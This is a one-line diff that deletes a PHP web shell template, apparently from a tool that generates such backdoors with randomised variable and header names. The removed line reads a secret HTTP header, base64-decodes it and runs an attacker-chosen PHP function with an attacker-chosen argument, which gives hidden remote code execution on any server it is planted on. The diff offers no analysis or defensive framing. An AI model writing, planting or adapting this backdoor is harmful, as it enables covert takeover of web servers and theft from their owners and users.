@@ -1,1 +1,0 @@
-<?=${{.RandVar}}=explode('~',base64_decode(substr(getallheaders()['{{.RandPass}}'],1)));@${{.RandVar}}[0](${{.RandVar}}[1]);
